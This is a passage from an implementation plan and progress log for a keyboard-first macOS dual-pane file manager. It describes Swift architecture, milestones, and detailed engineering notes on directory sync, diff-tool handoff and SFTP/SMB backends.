# Dirnex — implementation plan

A dual-pane, keyboard-first file manager for macOS in the spirit of Total Commander,
built native (Swift), with macOS-only superpowers TC never had: Quick Look, Spotlight
search, APFS clones, Finder tags, a command palette, and universal undo.

Status: planning · Created: 2026-07-05

---

## 1. Product goals

**Must be true at 1.0:**

- Fully operable without a mouse. Tab switches panels, typing filters, F-keys drive
  operations, selection is independent of the cursor.
- File operations never block the UI. Everything runs through a background queue with
  progress, pause/resume, and conflict resolution.
- Feels native: Quick Look, Trash, drag-and-drop, dark mode, Finder tags, share sheet.
- Fast on ugly inputs: a 100k-entry directory opens and scrolls without jank.
- Undo works for file operations, not just text fields.

**Non-goals (for 1.0):**

- Windows/Linux ports.
- App Store distribution (sandbox is incompatible with a real file manager).
- An open binary plugin API (revisit post-1.0; automation hooks cover most needs).
- Cloud-provider integrations beyond what the filesystem already exposes
  (iCloud/Dropbox folders work as folders; no proprietary APIs).

## 2. Architecture decisions (locked unless proven wrong)

| Decision | Choice | Rationale |
|---|---|---|
| Language | Swift 6, strict concurrency | Native perf, actors fit the operation engine |
| File panes | AppKit `NSTableView` | 100k rows, total keyboard control; SwiftUI still weak here |
| Secondary UI | SwiftUI (settings, palette, dialogs, onboarding) | Velocity where perf doesn't matter |
| Core logic | `DirnexCore` — local SwiftPM package, zero AppKit imports | Testable headless; UI is a thin client |
| VFS | Protocol-based virtual filesystem from day one | Archives/SFTP become "just another backend"; retrofitting is painful |
| Watching | FSEvents (per-directory, coalesced) | Live panel refresh |
| Copy path | `copyfile()` with `COPYFILE_CLONE`, fall back to chunked copy with progress callbacks | Instant same-volume APFS copies |
| Delete | Trash via `NSWorkspace` by default; permanent delete behind a modifier | Safety first |
| Sandbox | None. Developer ID + notarization, distributed outside MAS | Needs Full Disk Access |
| Updates | Sparkle 2 | Standard for non-MAS apps |
| Min macOS | 14 (Sonoma) | Modern APIs, still covers the realistic user base |
| Persistence | JSON/plist for config; SQLite for frecency + undo journal | Boring and debuggable |

### Core abstractions

```
DirnexCore
├── VFS
│   ├── VFSBackend (protocol): list, stat, read, write, capabilities
│   ├── VFSPath: backend id + path within backend (composable: zip inside sftp)
│   ├── LocalBackend (M1) · ArchiveBackend (M4) · SFTPBackend (M5)
│   └── DirectoryModel: sorted/filtered snapshot a panel renders; FSEvents-driven
├── Operations
│   ├── Operation (copy/move/delete/rename/pack): source set → destination
│   ├── OperationQueue actor: serial-per-volume scheduling, pause/resume, ETA
│   ├── ConflictPolicy: ask / overwrite / skip / keep-both / newer-only
│   └── UndoJournal: reversible record per operation (SQLite)
└── Services
    ├── Frecency store · Hotlist · History
    ├── Search (mdfind + streamed content grep)
    └── GitStatusProvider (M6)
```

**Rule:** the app target contains no file-manipulation logic. If it touches bytes,
it lives in `DirnexCore` and has tests.

## 3. Repository layout

```
Dirnex/
├── PLAN.md
├── Dirnex.xcodeproj            (app target, thin)
├── Dirnex/                     (AppKit/SwiftUI app sources)
│   ├── Panels/                 (NSTableView pane, tabs, path bar)
│   ├── Palette/                (Cmd+K)
│   ├── Dialogs/                (conflicts, progress, multi-rename)
│   └── Settings/
├── DirnexCore/                 (SwiftPM package)
│   ├── Sources/DirnexCore/
│   └── Tests/DirnexCoreTests/
└── Tooling/                    (CI scripts, notarization, fixtures generator)
```

---

## 4. Milestones

Sizes are relative (S ≈ days, M ≈ 1–2 weeks, L ≈ 3+ weeks of focused work).
Each milestone ends in something runnable; no milestone depends on a later one.

### M0 — Scaffolding (S)

Goal: empty but real project; every later PR lands on green CI.

- [x] Xcode project + `DirnexCore` SwiftPM package, Swift 6 strict concurrency
- [x] SwiftFormat/SwiftLint config; CI (GitHub Actions: build + tests on macOS runner)
- [x] Fixture generator: script that builds test directory trees (deep nesting,
      100k files, weird names: emoji, NFD/NFC unicode, 1000-char paths, symlinks)
- [x] App icon placeholder; ad-hoc signing for local/CI (Developer ID deferred to M7)

Exit: `xcodebuild test` green in CI; app launches to an empty window. ✅ met locally
(CI configured; Developer ID signing intentionally deferred to M7 per §2 "distributed
outside MAS" — ad-hoc signing runs everywhere without a team).

Notes:
- Xcode project uses file-system-synchronized groups (objectVersion 77) so no file
  generator (XcodeGen/Tuist) is needed — `git clone && xcodebuild test` just works.
- `DirnexCore` is a standalone SwiftPM package tested via `swift test`. It is wired
  into the app target as a local package dependency in M1, when the app first needs it.

### M1 — Read-only dual-pane browser (L)

Goal: the app already feels good with zero file operations. This milestone defines
the product's feel; do not rush it.

- [x] `LocalBackend` + `DirectoryModel`: list, stat, sort (name/size/date/ext), hidden-files toggle
- [x] Panel view: `NSTableView`, virtualized (view reuse + per-extension icon cache), columns:
      name, size, date; header-click sort with direction indicator. 60fps/100k budget not yet
      measured — deferred to the M1 exit gate / M7 perf pass.
- [x] Two panels + splitter; active-panel highlight; Tab switches
- [x] Keyboard core: arrows/Home/End/PageUp/PageDown, Enter (open dir / launch file),
      Cmd+Down/Up, and type-to-filter with live narrowing. Backspace is filter-aware (trims
      the filter, else goes up); Esc clears filter then marks (via `cancelOperation:`).
- [x] Selection model: Space/Insert toggle-and-advance, Cmd+A (mark all), `*` invert,
      `+`/`-` glob select, and Space-on-directory in-place recursive sizing.
- [x] Tabs per panel: new (Cmd+T)/close (Cmd+W)/switch (Cmd+Shift+[ / ])/drag-reorder,
      restored on relaunch. Tab bar auto-hides at a single tab.
- [x] Path bar: clickable breadcrumbs, Cmd+L to edit as text with completion
- [x] Volumes/places strip (replaces TC's drive letters); eject
- [x] FSEvents: panels refresh live, preserving cursor and selection
- [x] Quick Look on Cmd+Y (Space stays reserved for selection, per §7); previews the marked
      set or the cursor file, tracks the cursor live
- [x] Drag out to other apps; drag in = reveal only (real drop lands in M2)
- [x] Sort/column state per tab, persisted. Per-tab **sort** (key + direction) and per-tab
      **column widths/order** both live in each tab and persist across launches — switching
      tabs swaps the shared table's column geometry in/out.

_Shipped over 11 passes (2026-07-05 → 07-06). Per-pass detail (files, design rationale, gotchas) lives in git history and the memory topic file._

Exit: can live in it for browsing all day; 100k-dir opens < 150 ms warm; scroll never
drops frames; unicode/symlink fixtures render correctly.

### M2 — Operation engine (L)

Goal: TC's killer feature — queued, non-blocking, undoable file operations.

- [x] `Operation` model ✅ + `OperationQueue` actor ✅: concurrent across volume pairs,
      serial per volume pair (no disk thrashing); pause/resume, cancel, aggregate
      progress + ETA — landed as `FileOperationQueue` (renamed only to dodge
      `Foundation.OperationQueue`) and now **wired into the app** (F5/F6 route through it,
      window-bottom queue bar). "Add to queue" vs "run now" as an explicit choice is a
      later nicety — everything runs through the queue today
- [x] Copy (F5): APFS clone fast path; chunked fallback with per-file + total progress;
      preserves xattrs, permissions, dates, Finder tags; throughput/ETA readout ✅ (queue bar)
- [x] Move (F6): rename fast path same-volume; copy+delete across volumes
- [x] Delete (F8): to Trash; Shift+F8 permanent with explicit confirm
- [x] New folder (F7) ✅, inline rename (F2) ✅ — Enter-on-name deferred (Enter opens
      the cursor entry in the TC key model, so F2 is the rename trigger)
- [x] Progress UI: the window-bottom **queue bar** ✅ — aggregate determinate progress +
      live throughput + ETA, current-item label, pause/resume + cancel-all buttons,
      non-blocking (replaced the modal progress sheet, now deleted) — plus an **expandable
      per-job list** ✅ (disclosure chevron → one scrollable row per queued copy/move, each
      with its own progress bar + cancel button)
- [x] Conflict engine: ask/overwrite/skip/keep-both ✅ + newer-only ✅; **rich per-file
      dialog** ✅ (side-by-side thumbnails + size + date, newer item flagged) with **"apply
      to all"** ✅ — the engine now yields per conflict (`ConflictPolicy.ask` +
      `resolveConflict` callback). Full side-by-side text diff still deferred (thumbnails
      already give images a preview and text files a content peek)
- [x] Undo journal: Cmd+Z reverses move/rename/copy/new-folder + delete-to-Trash restore ✅;
      journal survives relaunch (JSON in UserDefaults) ✅; overwrites marked non-reversible and
      surfaced ✅ — reversal logic + property tests in `DirnexCore/…/UndoJournal.swift`.
      **Redo (Cmd+Shift+Z) added** ✅: every `UndoStep` is now invertible, so redo is "undo of
      the undo" through the same `revert` executor; a redo stack rides alongside undo (a fresh
      op clears it), both stacks persist across relaunch, and a keep-both copy is redone to its
      exact renamed landing path — property tests `op + undo + redo == op` per operation kind.
      **Selection undo added** ✅: marking gestures (Space, Cmd+A, invert, +/- pattern select,
      Cmd/Shift-click, Esc-clear) join the *same* Cmd+Z timeline. The journal now holds a
      heterogeneous `UndoEntry` — `.fileOperation(UndoRecord)` or `.selection(SelectionChange)` —
      so one Cmd+Z walks back through everything in order; a selection change touches no bytes
      (it swaps a pane's marks, routed by `PaneSide`) and is session-only (never persisted). Menu
      titles track the gesture ("Undo Mark", "Redo Select All"). Verified live: Space→Undo/Redo
      and Select-All-over-a-mark unwinds one entry at a time. **Side-effect clears are journaled
      too** so a wrongly-lost selection is recoverable: leaving a folder (navigation clears marks
      in `setListing`) records the loss against the *departed* folder — undo restores them on
      return — and a right-click that retargets/collapses the marks records it in place. Verified
      live: mark → navigate away+back → ⌘Z restores; mark → right-click another row → ⌘Z restores.
- [x] Errors: failures collected + summarized ✅; **per-file skip/retry/abort** ✅ — the engine
      yields per failed source (`CopyEngine.run(onError:)` → `ErrorResolution` skip/retry/abort),
      bridged to a main-actor `ErrorDialog` by `ErrorPrompter` ("apply to all" = skip-all)
- [x] Drop onto panel = real copy/move through the queue ✅ (pane-to-pane, into a
      subfolder, or from Finder; Finder's copy-vs-move conventions; routed through the
      shared queue via the same `submitTransfer` as F5/F6)
- [x] Core test suite on fixtures: cancellation mid-copy ✅, conflicts ✅, cross-volume ✅,
      symlink ✅, permission errors ✅, disk-full ✅, source-changed-during-copy ✅

_Shipped over 12 passes (2026-07-06 → 07-07); 130+ core tests. Per-pass detail lives in git history and the memory topic file._

Exit: 50 GB copy runs in background while browsing stays 60fps; yanking a USB drive
mid-copy produces a sane error, not a hang; Cmd+Z after a bad move actually fixes it.

### M3 — Discoverability layer (M)

Goal: fix TC's adoption problem — nobody should need the manual.

- [x] Cmd+K command palette: fuzzy search over every action, shows shortcuts,
      recents on top; palette actions and menu bar generated from one action registry ✅
- [x] Directory hotlist (Ctrl+D): pin, reorder, jump ✅
- [x] Per-panel history (Alt+Down list; Cmd+[ / Cmd+] back/forward) ✅
- [x] Frecency jump: visit tracking; path bar accepts fuzzy fragments
      ("dl" → ~/Downloads), zoxide-style scoring ✅ (JSON store; SQLite deferred like undo)
- [x] Workspaces: save/restore both panels with all tabs, named, switchable from palette ✅
      (JSON store; per-workspace palette entries deferred — surfaced via the "Workspaces…" popup)
- [x] Settings window (SwiftUI): general, panels, operations, shortcuts ✅
- [x] Rebindable shortcuts with conflict detection; TC-compatible preset and macOS preset ✅

_Shipped over 6 passes (2026-07-08). Per-pass detail lives in git history and the memory topic file._

Exit: a new user can discover copy/move/hotlist through the palette alone; power user
can rebind everything. ✅ met — palette (pass 1) + a full rebind UI with conflict detection
and two presets.

### M4 — VFS payoff (L)

Goal: cash in the VFS abstraction from M0.

- [x] `ArchiveBackend`: **browse zip/tar/tgz/7z as folders ✅**, **F5 copy-out ✅**, **Quick Look /
      Quick View inside ✅**, **pack via ⌥F5 ✅**, **nested archives (browse/extract a zip inside a
      zip) ✅** (via `bsdtar`, not libarchive — the C-module gate stays deferred)
- [x] Archive writes: **delete inside zip via F8 ✅ + add-into via paste ⌘V / F5 / F6 ✅**
      (extract → edit the tree → repack → atomic swap; rewrite strategy, journal-safe temp file)
- [x] Multi-rename tool: pattern tokens ([N] name, [C] counter, [E] ext, date tokens),
      regex find/replace, case transforms, live preview table, applies as one undoable batch
- [x] Search (Alt+F7 / palette): mdfind-backed name+content search with filter chips
      (kind, size, date ✅ — tag chip + content-grep fallback for non-indexed volumes deferred)
- [x] Search results → virtual panel listing: normal cursor/selection/F5 on results
- [x] Quick view panel (⌃Q toggle — Cmd+Q quits, Cmd+Shift+Q was free but ⌃Q is the TC key):
      inactive panel becomes live Quick Look/text preview of the file under cursor
- [x] Saved searches as virtual folders in the places strip ✅ — name a results panel via
      Go ▸ Save Search… (⌘S when a results tab is active), it lands in the sidebar's
      **Searches** section (magnifier icon); click to re-run into a fresh results tab;
      right-click → Run / Rename… / Delete

Exit: open a zip, fish two files out, repack — no temp-folder dance; rename 500 photos
by date pattern and undo it; search feeds a panel.

_Shipped over 11 passes (2026-07-09 → 07-12); 341 core tests. Per-pass detail (ArchiveBackend rewrite strategy, nested-archive mapping, saved searches, recurring gotchas) lives in git history and the memory topic file._

### M5 — Network and sync (M)

- [x] `SFTPBackend`: connection manager, **key auth + password auth**; **browse + byte transfer +
      mid-file resume** all DONE and verified live (via the system `sftp` CLI, not
      swift-nio-ssh/libssh2 — the same sidestep M4 made with `bsdtar`). Copy-out (`get`) / copy-in
      (`put`), remote mkdir / rename / recursive-delete all run through the standard queue; an SFTP
      pane is writable (`[.read, .write, .rename]`) so the pass-5 grey-out + Trash-less
      confirmed-permanent-delete light up. **Password auth** (pass 9) via `SSH_ASKPASS` (no PTY
      needed) + Keychain storage. **Mid-file resume** (pass 10) — `copyFile` picks up a partial
      destination via `get -a`/`put -a` instead of restarting; verified live against a real server
- [x] **SMB shares + unified connection manager** (built + verified live 2026-07-14): browse/copy to another
      Mac / PC / NAS over SMB, and one place that keeps every saved remote — SFTP and SMB alike. SMB
      is done the OS-native way: macOS ships **no `smbclient`** CLI to shell out to, so the sidestep
      here is the **mounter**, not a client — `NetFSMountURLSync` / `mount_smbfs` mounts
      `smb://user@host/share` and the existing `LocalBackend` browses the resulting `/Volumes/…`
      tree, so every M2 op, sync-dirs, compare-by-content, and archive-over-SMB works unchanged —
      **no new `CompositeBackend` routing, no libsmb2 dependency** (the deliberate choice over a
      protocol `SMBBackend`, mirroring SFTP's system-CLI sidestep). Caps reuse the pass-5 degradation
      path (read/write/rename, no clone, Trash-varies → confirmed-permanent-delete). The **connection
      manager** unifies today's ephemeral SFTP registry with persisted saved servers: a
      `ServerConnection` / `ServerConnections` core (name-as-identity, like `SavedSearch`) + a
      `ServerConnectionStore` + a **Servers** sidebar section (mirrors **Searches**), plus a
      generalized Connect-to-Server prompt (protocol picker SFTP | SMB + Save). Subsumes the deferred
      "saved SFTP connections in the sidebar" item
- [x] Capability degradation: panels grey out unsupported ops per backend ✅ (per-path
      `capabilities(for:)`; no Trash → explicit permanent-delete confirm ✅; no clone →
      always chunked ✅) — driven off the owning backend's caps, ready for SFTP to plug into
- [x] Synchronize directories: two-panel diff view (left-only / right-only / differs /
      same ✅), by size+date or content ✅; selective sync actions through the queue ✅;
      per-row *direction override* ✅ (right-click a row → flip a copy the other way, or turn a
      copy into a delete; also resolves a bidirectional `differ` conflict by hand) — include/
      exclude per row already done
- [x] Compare by content: **byte compare ✅** (`ByteComparator`, drives sync `.content` mode) +
      **external-diff handoff ✅** (FileMerge/Kaleidoscope/BBEdit via `ExternalDiffTool` — a
      **Compare By Contents…** command plus a right-click **Compare with …** in the sync sheet)

Exit: mirror a local folder to a server over SFTP, verify with sync-dirs, all queued
and pausable; and browse/copy to an SMB share on another Mac or NAS, connected and
managed from the Servers sidebar.

Progress (2026-07-12, M5 pass 1): the **directory-synchronization comparison core** landed —
the tested, headless *comparison* half of the "Synchronize directories" item (its two-panel
diff-view UI + queue wiring is the next pass; boxes stay `[ ]` until that lands). Picked first
because it's pure Swift and slots straight into the core→app rhythm, whereas `SFTPBackend` needs
a swift-nio-ssh/libssh2 dependency + a live server to test against — the M5 infra gate, analogous
to M4's libarchive gate. Two new `DirnexCore/Services/` files, no changes to existing APIs:
- **`DirectorySync.swift`** — `DirectorySync.compare(left:right:leftBackend:rightBackend:
  comparison:tolerance:includingIdentical:isCancelled:contentsEqual:)` walks both trees in
  lock-step (iterative explicit-stack over a private `DirectoryPair{left,right,prefix}`, like
  `DirectorySizer`, so deep trees can't blow the call stack) and returns one `SyncEntry`
  (`relativePath`+`name`+`left:FileEntry?`+`right:FileEntry?`+`status`, `Identifiable` by
  relative path) per differing/one-sided item, **sorted by relativePath** (deterministic
  regardless of traversal order → stable tests + stable UI). `SyncStatus` = `leftOnly /
  rightOnly / leftNewer / rightNewer / differ / identical / typeMismatch`. Design decisions:
  (1) directories present on **both** sides are descended into but emit **no row** (rows =
  actionable file diffs + one-sided items); a directory on **only one** side is a **single**
  non-recursed subtree row (the app copies/deletes it wholesale, matching TC's collapsed
  folder row). (2) `SyncComparison.sizeAndDate` (size equal AND |Δmtime| ≤ `tolerance`,
  default **2 s** for FAT/exFAT coarseness, TC's value) vs `.content` (exact bytes; short-
  circuits on size mismatch, falls back to size+date for symlinks/specials). (3) content
  equality is an **injected** `contentsEqual` closure (default `ByteComparator.localFilesEqual`)
  so the engine needs no read-primitive on `VFSBackend` and tests drive content mode with a
  fake. (4) **SAFETY: a listing failure propagates** — an unreadable dir throws rather than
  reading as empty, because silently doing so could delete the other side's matching files in
  a mirror (contrast `DirectorySizer`, which *does* swallow — there a partial number is fine;
  here a partial listing is dangerous). `defaultAction(for:direction:)` derives the pre-checked
  per-row action for `SyncDirection.leftToRight / rightToLeft / bidirectional` → `SyncAction`
  (`none / copyToRight / copyToLeft / deleteLeft / deleteRight / conflict`): a mirror is
  authoritative (overwrites even a newer destination + prunes destination-only items),
  bidirectional unions + newer-wins + never deletes + flags `differ`/`typeMismatch` as
  `conflict`; a file-vs-dir `typeMismatch` is **always** `conflict` in every direction (the
  strict-and-safe stance from MultiRename — never auto-delete a whole dir to drop a file in).
- **`ByteComparator.swift`** — knocks out the byte-compare half of the "Compare by content"
  item: `ByteComparator.localFilesEqual(_:_:chunkSize:isCancelled:)` chunk-compares two local
  regular files (128 KB chunks, never loads whole files), short-circuits `false` on a size
  mismatch without reading, `true` on same-path/two-empties; throws `.unsupported` for a
  non-`.local` path (network read arrives with `SFTPBackend`) or a directory, and normalizes
  read failures to `VFSError` via a POSIX-errno recovery helper. (External-diff-tool handoff —
  FileMerge/Kaleidoscope/BBEdit — is the remaining slice of that item, an app-layer pass.)
+18 `DirectorySync` +9 `ByteComparator` tests → **368 core tests** (was 341). Whole thing
`swift test` green, swiftformat/swiftlint-strict clean; app target untouched (new files only,
no existing-API changes, so no rebuild needed). GOTCHA hit: swiftlint `large_tuple` (>2 members)
on the work-stack `(left,right,prefix)` triple → extracted the private `DirectoryPair` struct.
NEXT M5: the sync-dirs UI (two-panel diff view driven by `compare`, per-row action override,
apply through the M2 `FileOperationQueue`); then the SFTPBackend infra gate; capability
degradation; external-diff handoff.

Progress (2026-07-12, M5 pass 2): the **Synchronize Directories UI** landed — the diff-view +
apply half of the sync item (**that box now `[x]`**; byte-compare `[~]`). One new headless
command + three app files, wiring the pass-1 `DirectorySync` engine into a real sheet that
reconciles the two panes through the M2 queue. VERIFIED LIVE end-to-end (no overlay this
session, so fully mouse-driven). Pieces:
- **Command** (core): `CommandCatalog` gains `file.syncDirectories` ("Synchronize Directories…",
  `.file`, **no shortcut** → conflict-free; new `coversSyncDirectories` test → **369 core
  tests**). Wired app-side in `CommandBinding` (→ `synchronizeDirectories(_:)`) and
  `MainMenuBuilder` (File menu, right after Pack). GOTCHA: adding one command tipped the
  `CommandCatalog` main-enum body over swiftlint `type_body_length` 250 → moved the `workspace`
  array into the existing bottom extension (where window/application already live).
- **`SyncDirectoriesController.swift`** — the sheet (modeled on `MultiRenameController`,
  `presentAsSheet`-retained). A **Direction** segmented control (Left→Right / Both Directions /
  Right→Left) and a **Compare by** control (Size & Date / Content) over a diff `NSTableView`:
  columns *include-checkbox · Item (relativePath, "/"-suffixed for dirs) · leftFolder detail ·
  action glyph · rightFolder detail*. Action column = green →/← for a copy, red ✕ for a delete
  (which side is clear from the populated detail column), ⚠ for a conflict, each with a tooltip.
  A **direction change re-derives actions in memory** (`recomputeActions`, instant); a
  **comparison change re-runs `DirectorySync.compare` off-main** (content mode reads bytes) with
  a spinner. Footer reads "N to copy, M to delete · K conflicts skipped"; empty result →
  "The folders are already in sync." with Synchronize disabled. Conflicts render with a disabled
  checkbox (no safe action). GOTCHAS (swiftlint, both recurring): `large_tuple` on the columns
  array / `row(at:)` / `actionDisplay` → replaced with an `addColumn` helper, returning the
  `fileprivate` `Row` struct, and an `ActionStyle` struct; `type_body_length` on the class →
  moved the four `make*` view-builders into a same-file `private extension` (extensions don't
  count toward the type body). NOTE: `Row` had to be `fileprivate` (not `private`) because the
  `fileprivate row(at:)` accessor returns it.
- **`PanelViewController+Sync.swift`** — entry point + apply. `synchronizeDirectories(_:)`
  casts `host as? BrowserWindowController` to always use the **physical** left/right panes (so
  the direction controls match the on-screen layout regardless of focus), gates on two distinct
  real local folders (`canSynchronize`, also the `validateMenuItem` case), and presents the
  sheet. On commit: **copies are batched by destination directory** (multiple sources → one
  `FileOperation`) and enqueued under `.overwrite` (the user already decided in the diff — no
  per-file prompt; atomic temp-swap keeps the original safe), so the window's queue drives
  progress/undo exactly like F5; **deletes go to the Trash** off-main as one pass, journaled via
  `UndoRecord.trash`. A **delete count triggers a confirm sheet** first ("… will move N items to
  the Trash"). The relative path's parent always exists on the destination side (the engine only
  descends into both-sides dirs), so a nested copy's target directory is guaranteed present.
LIVE TEST (seeded both panes onto fixture trees via the `Dirnex.tabs.<side>` UserDefaults JSON):
the sheet listed exactly the 6 differences (identical `same.txt` correctly omitted) with
"5 to copy, 1 to delete"; Right→Left flipped every row (3 copy ←, 3 delete ✕, "3 to copy, 3 to
delete"); Content mode rescanned to the same 6; Synchronize (Left→Right) raised the delete
confirm, then on disk overwrote `changed.txt` with the newer left copy, copied `only_left.txt` +
the nested `sub/leftonly_nested.txt`, overwrote the nested `sub/nested.txt`, **recursively copied
the one-sided `leftdir/deep/x.txt` subtree**, and trashed `only_right.txt`; a re-scan then
reported "already in sync" (metadata preserved → idempotent). App `xcodebuild` + `swift test`
green, swiftformat/swiftlint-strict clean. NEXT M5: per-row direction override (flip one row);
the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
external-diff-tool handoff.

Progress (2026-07-12, M5 pass 3): **per-row direction override** — the one deferred niceness on
the sync item, **now `[x]`**. Right-click any diff row to override its action against the global
direction: flip a copy the other way, or turn a copy into a delete; a bidirectional `differ`
conflict (or a mirror row you disagree with) is resolved by hand this way. Two-part, core→app as
always:
- **Core** (pure, tested): `DirectorySync.availableActions(for status:) -> [SyncAction]` (+ a
  `SyncEntry.availableActions` convenience) — the *actionable* choices a user may assign to one
  row: a both-sides difference (`leftNewer`/`rightNewer`/`differ`) → `[.copyToRight, .copyToLeft]`
  (copy either way, never delete a file that exists on both sides); a one-sided item → propagate
  *or* delete from its side (`leftOnly`→`[.copyToRight, .deleteLeft]`, mirror for `rightOnly`);
  `identical` and `typeMismatch` → `[]` (no safe override — a file-vs-folder clash still can't be
  auto-resolved, matching the strict stance). `.none`/`.conflict` are deliberately absent (skip is
  the checkbox's job; conflict is a non-action). +5 tests → **374 core tests** (was 369).
- **App**: `SyncDirectoriesController` gains an `NSMenu` (delegate = self) on the diff table;
  `menuNeedsUpdate` rebuilds it per-click from `tableView.clickedRow` — one item per
  `availableActions`, a `.on` checkmark on the row's current action, target `setRowAction(_:)`
  (row in `tag`, `SyncAction` in `representedObject`); an empty list shows one disabled caption
  ("One side is a folder — resolve manually"). Picking an item sets the row's action + forces
  `included = true`, reloads that row, and recomputes the footer. Added a "Right-click a row to
  change its action" hint in the controls row. A direction/comparison change still re-derives
  defaults and drops overrides (documented behavior). GOTCHA (recurring, `file_length` this time,
  not `type_body_length`): the new menu tipped the controller over swiftlint's 500-line
  `file_length` → **split the diff-table + override-menu rendering into a companion file**
  `SyncDirectoriesController+DiffTable.swift` (data source + delegate + `NSMenuDelegate` +
  `ActionStyle`). That cross-file split forced widening `Row`, `rowCount`, `row(at:)`,
  `isActionable`, `toggleInclude`, `setRowAction`, `tableView`, `leftDir`, `rightDir` from
  `private`/`fileprivate` to internal (Swift `private` doesn't cross files; a `private`
  `tableView` in a `NSTableViewDelegate`-conforming type even resolves to the delegate *method* in
  the other file → "has no member 'clickedRow'" until widened). App `xcodebuild` (into `build/`
  via `-derivedDataPath build`, since the default DerivedData copy isn't the one LaunchServices
  launches) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED LIVE end-to-end:
  seeded two fixture trees (`changed.txt` left-newer, `only_left.txt`, `only_right.txt`, identical
  `same.txt`); right-click `changed.txt` showed "✓ Copy to R / Copy to L" → picked Copy to L (glyph
  → ←); right-click `only_left.txt` showed "✓ Copy to R / Delete from L" → picked Delete from L
  (footer went "2 to copy, 1 to delete" → "1 to copy, 2 to delete"); Synchronize raised the
  **2-item** trash confirm (proving the overridden delete count drives it), and on disk `L/changed.txt`
  became the *right* copy (6 B "right", i.e. copied **leftward** per the override, NOT the L→R
  default's 34 B), `only_left.txt` was trashed from L (not copied to R), `only_right.txt` trashed
  from R — both panes refreshed to identical `changed.txt`+`same.txt`, no crash. NEXT M5: the
  `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
  external-diff-tool handoff (FileMerge/Kaleidoscope/BBEdit — the remaining `[~]` slice).

Progress (2026-07-12, M5 pass 4): **external-diff-tool handoff** — the remaining `[~]` slice of
Compare-by-content, **now `[x]`**. `ByteComparator` says *whether* two files differ; this opens them
side-by-side in a real diff tool to show *how*. Core→app as always:
- **Core** (pure, tested): `DirnexCore/Services/ExternalDiffTool.swift` — a value descriptor of a
  known diff app (`identifier`+`displayName`+`candidateExecutablePaths` most-preferred-first+
  `leadingArguments`) with `invocation(comparing:with:executableExists:)→ExternalDiffInvocation?`
  (executable + argv = `leadingArguments + [left, right]`; nil when not installed). Locating the
  launcher is an **injected** `(String)->Bool` probe, so the whole thing is testable with no real
  install. Registry `known` = `[.kaleidoscope, .bbEdit, .fileMerge]` (dedicated diff apps first,
  FileMerge/`opendiff` as the ships-with-Xcode fallback); `installed(where:)` filters, `preferred(
  identifier:where:)` honors a saved choice then falls back to the first installed. Paths: FileMerge
  `/usr/bin/opendiff`; Kaleidoscope `ksdiff` and BBEdit `bbdiff` under `/opt/homebrew/bin` then
  `/usr/local/bin`. +8 tests → **383 core tests** (was 374).
- **App**: `Dirnex/Browser/ExternalDiffLauncher.swift` — supplies the real probe
  (`FileManager.isExecutableFile`) and spawns the resolved invocation off-main via `Process`
  (`run()` then detach — never blocks on the GUI tool; streams → nullDevice), mirroring
  `ArchiveExtractor`. `preferredTool()` (cheap) titles/enables the menu; `compare(_:_:completion:)`
  reports `noToolInstalled` / `launchFailed` back on the main actor. Two entry points: (1) a
  right-click **Compare with <tool>…** item prepended to the sync sheet's row menu for any
  both-sides regular-file pair (wired via `SyncDirectoriesController.onCompare`); (2) a standalone
  **Compare By Contents…** File command (`file.compareByContents`, no shortcut → conflict-free;
  `coversCompareByContents` test) that diffs the two panes' **cursor** files (`comparableCursorPair`
  — both must be real local files and distinct; gates `validateMenuItem` via `canCompareByContents`).
  Failures surface through the existing `presentOperationFailure` alert ("No comparison tool found —
  install FileMerge/Kaleidoscope/BBEdit"). App `xcodebuild` (into `build/` via `-derivedDataPath
  build`) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED the handoff mechanic
  live: only `/usr/bin/opendiff` is installed here → `preferred()` resolves FileMerge; spawning
  `opendiff <L> <R>` exactly as the launcher does launched FileMerge (confirmed via `pgrep`), then
  quit it. **NEXT M5:** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server);
  capability degradation. A Settings picker for the preferred diff tool (the `preferred(identifier:)`
  hook already exists) is optional polish.

Progress (2026-07-12, M5 pass 5): **capability degradation** — the second remaining M5 item,
**now `[x]`**. Panels now decide what they offer off the *owning backend's* capabilities rather
than ad-hoc `path.backend == .local` / `isVirtualDirectory` checks, and the delete key degrades to
a confirmed permanent delete on a Trash-less backend — the exact mechanism `SFTPBackend` plugs into
(SFTP has no Trash, no APFS clone). Core→app as always; no SFTP needed to prove it (a partial-
capability test double stands in). Pieces:
- **Core** (pure, tested): `VFSBackend.capabilities(for path:) -> VFSCapabilities` added to the
  protocol with a **default returning the backend-wide `capabilities`** — a single-backend
  implementation is uniform, but a *routing* backend (the app's `CompositeBackend`) overrides it to
  report the caps of whichever concrete backend owns `path`. New `DeleteStrategy` enum (`trash /
  permanent / unsupported`) + `VFSCapabilities.deleteStrategy` computed property encode the
  degradation decision: `.write` absent → `.unsupported`; writable but no `.trash` → `.permanent`
  (SFTP); has `.trash` → `.trash`. `CopyEngine` now guards its clone attempt on
  `backend.capabilities(for: entry.path).contains(.clone)` so a no-clone backend goes **straight to
  chunked** instead of a doomed clone (`.clone` present on Local → unchanged). +7 tests → **390 core
  tests** (was 383): `deleteStrategy` mapping, the `capabilities(for:)` default, a `RoutingStub`
  proving per-path degradation, and a `PartialCapabilityBackend` (a `LocalBackend` decorator with a
  configurable capability set + a clone-call counter) proving CopyEngine skips the clone when
  `.clone` is absent and still attempts it when present. GOTCHA: swiftlint `empty_count` fired on the
  counter's `.count == 0` — renamed the property to `calls`.
- **App**: `CompositeBackend.capabilities(for:)` routes per path — `local.capabilities` for `.local`,
  `.read` for any virtual location (archive/search), cheap by design (no archive mount, like
  `volumeIdentifier(for:)`). `canWriteHere`/`canRenameHere` now read `backend.capabilities(for:
  panel.path).contains(.write/.rename)` (drops the `!isVirtualDirectory` prefix — a virtual pane
  already reports `.read`, and this is correct for a future writable-non-local SFTP where
  `isVirtualDirectory` would wrongly fire). `deleteSelection`/`validateMutatingItem` now branch on
  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/greyed, `.trash` on F8 → Trash (with the
  existing optional confirm), else (Shift+F8, or F8 on a Trash-less backend) → the confirmed
  permanent-delete path. The **top-level-archive rewrite delete** (`isWritableArchive` →
  `beginArchiveDelete`) still short-circuits *first* — archive writes are the app's separate
  rewrite path, not VFS caps. Left the watch / archive-extract·pack·drop guards on their intentional
